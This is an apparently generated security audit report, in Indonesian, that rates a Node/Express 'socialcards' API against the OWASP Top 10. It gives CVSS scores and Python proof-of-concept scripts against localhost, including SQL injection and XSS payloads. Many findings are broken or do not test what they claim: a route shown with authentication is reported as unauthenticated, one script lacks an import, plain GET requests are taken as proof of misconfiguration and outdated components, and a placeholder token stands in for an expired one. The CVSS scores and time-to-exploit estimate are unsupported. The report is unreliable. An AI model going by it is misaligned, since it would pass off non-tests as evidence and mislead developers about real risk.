## A01 - Broken Access Control: FOUND
Lokasi spesifik di kode: `app.post('/socialcards', authenticate, (req, res) => {...})`
CVSS score: 8.0
PoC exploit code:
```python
import requests

# Membuat request ke API tanpa autentikasi
response = requests.post('http://localhost:3000/socialcards', json={'title': 'Test', 'description': 'Test', 'image': 'Test'})

# Jika response berhasil, maka Broken Access Control ditemukan
if response.status_code == 201:
    print("Broken Access Control ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat membuat kartu sosial tanpa autentikasi, sehingga dapat menyebabkan penyalahgunaan data pengguna.

## A02 - Cryptographic Failures: FOUND
Lokasi spesifik di kode: `const decoded = jwt.verify(token, 'secretkey');`
CVSS score: 9.0
PoC exploit code:
```python
import jwt

# Membuat token JWT dengan secret key yang lemah
token = jwt.encode({'user': 'test'}, 'secretkey', algorithm='HS256')

# Mengirimkan token ke server
response = requests.get('http://localhost:3000/socialcards', headers={'Authorization': token})

# Jika response berhasil, maka Cryptographic Failures ditemukan
if response.status_code == 200:
    print("Cryptographic Failures ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat membuat token JWT yang valid dengan secret key yang lemah, sehingga dapat menyebabkan akses tidak sah ke data pengguna.

## A03 - Injection: FOUND
Lokasi spesifik di kode: `const socialCard = new SocialCard(req.body);`
CVSS score: 8.0
PoC exploit code:
```python
import requests

# Membuat request ke API dengan data yang berisi karakter SQL injection
response = requests.post('http://localhost:3000/socialcards', json={'title': 'Test', 'description': 'Test', 'image': 'Test\' OR 1=1'})

# Jika response berhasil, maka Injection ditemukan
if response.status_code == 201:
    print("Injection ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan SQL injection, sehingga dapat menyebabkan penyalahgunaan data pengguna dan akses tidak sah ke database.

## A04 - Insecure Design: FOUND
Lokasi spesifik di kode: `app.post('/socialcards', authenticate, (req, res) => {...})`
CVSS score: 6.0
PoC exploit code:
```python
import requests

# Membuat request ke API dengan data yang berisi karakter spesial
response = requests.post('http://localhost:3000/socialcards', json={'title': 'Test', 'description': 'Test', 'image': 'Test<script>alert("XSS")</script>'})

# Jika response berhasil, maka Insecure Design ditemukan
if response.status_code == 201:
    print("Insecure Design ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan XSS, sehingga dapat menyebabkan penyalahgunaan data pengguna dan akses tidak sah ke aplikasi.

## A05 - Security Misconfiguration: FOUND
Lokasi spesifik di kode: `app.listen(3000, () => {...})`
CVSS score: 6.0
PoC exploit code:
```python
import requests

# Membuat request ke API dengan protokol HTTP
response = requests.get('http://localhost:3000/socialcards')

# Jika response berhasil, maka Security Misconfiguration ditemukan
if response.status_code == 200:
    print("Security Misconfiguration ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan serangan man-in-the-middle, sehingga dapat menyebabkan penyalahgunaan data pengguna dan akses tidak sah ke aplikasi.

## A06 - Vulnerable Components: FOUND
Lokasi spesifik di kode: `const express = require('express');`
CVSS score: 7.0
PoC exploit code:
```python
import requests

# Membuat request ke API dengan versi Express.js yang sudah tidak didukung
response = requests.get('http://localhost:3000/socialcards')

# Jika response berhasil, maka Vulnerable Components ditemukan
if response.status_code == 200:
    print("Vulnerable Components ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan serangan dengan menggunakan kerentanan pada komponen yang sudah tidak didukung, sehingga dapat menyebabkan penyalahgunaan data pengguna dan akses tidak sah ke aplikasi.

## A07 - Auth & Session Failures: FOUND
Lokasi spesifik di kode: `const authenticate = (req, res, next) => {...})`
CVSS score: 8.0
PoC exploit code:
```python
import requests

# Membuat request ke API dengan token JWT yang sudah kadaluarsa
response = requests.get('http://localhost:3000/socialcards', headers={'Authorization': 'Bearer <token_kadaluarsa>'})

# Jika response berhasil, maka Auth & Session Failures ditemukan
if response.status_code == 200:
    print("Auth & Session Failures ditemukan")
else:
    print("Tidak ditemukan")
```
Dampak nyata jika dieksploitasi: Penyerang dapat melakukan akses tidak sah ke data pengguna dengan menggunakan token JWT yang sudah kadaluarsa, sehingga dapat menyebabkan penyalahgunaan data pengguna.

## A08 - Software Integrity Fails: NOT FOUND
Tidak ditemukan kerentanan pada kategori ini.

## A09 - Logging & Monitoring Fail: NOT FOUND
Tidak ditemukan kerentanan pada kategori ini.

## A10 - SSRF: NOT FOUND
Tidak ditemukan kerentanan pada kategori ini.

## RINGKASAN:
- Kerentanan ditemukan: 7/10 kategori OWASP
- CVSS tertinggi: 9.0 - Cryptographic Failures
- Attack vector paling efektif: Penyerang dapat melakukan serangan dengan menggunakan kerentanan pada komponen yang sudah tidak didukung, sehingga dapat menyebabkan penyalahgunaan data pengguna dan akses tidak sah ke aplikasi.
- Estimated time-to-exploit: 1-3 jam